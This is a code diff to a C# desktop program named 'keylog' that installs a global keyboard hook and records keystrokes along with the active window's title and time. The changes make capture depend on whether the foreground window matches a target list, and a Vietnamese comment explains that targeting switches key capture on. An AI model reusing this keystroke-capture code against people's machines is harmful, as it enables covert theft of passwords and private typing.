@@ -55,7 +55,7 @@ namespace keylog
             keyListener = new KeyboardHookListener(new GlobalHooker());
             keyListener.KeyDown += KeyListener_KeyDown;
         }
-        static bool targeted = false;
+        private static bool targeted = true;
         private void KeyListener_KeyDown(object sender, KeyEventArgs e)
         {
             
@@ -63,6 +63,7 @@ namespace keylog
             {
                 var format = @"[""{0}"" {1}]" + Environment.NewLine + Environment.NewLine;
                 var text = string.Format(format, Functions.GetActiveWindowText(), DateTime.Now);
+                // neu co thi targeted = true => bat key
                 targeted = Functions.IsTarget(Functions.GetActiveWindowText(), targetList);
                 if (hasSubmitted)
                 {
@@ -73,8 +74,7 @@ namespace keylog
                 lastActiveWindow = Functions.GetForegroundWindow();
             }
 
-            if (Boolean.Parse(config_target["ByFollowingApp"].ToString()) == false
-                || (targeted == true && Boolean.Parse(config_target["ByFollowingApp"].ToString()) == true))
+            if (targeted)
             {
                 var keyText = keyMapper.GetKeyText(e.KeyCode);
                 // remove packet when using vietkey
@@ -340,6 +340,7 @@ namespace keylog
                         sr.Close();
                     }
                 }
+
             }
             //---------------------------------//
             // user
@@ -362,7 +363,7 @@ namespace keylog
             mainpanel.Controls["Dashboard"].BringToFront();
             btn_home.Visible = false;
             // Load form main again to load config file
-            mainForm_Load(sender, e);
+           // mainForm_Load(sender, e);
         }
         ToolTip tool; 
         private void btn_home_MouseHover(object sender, EventArgs e)
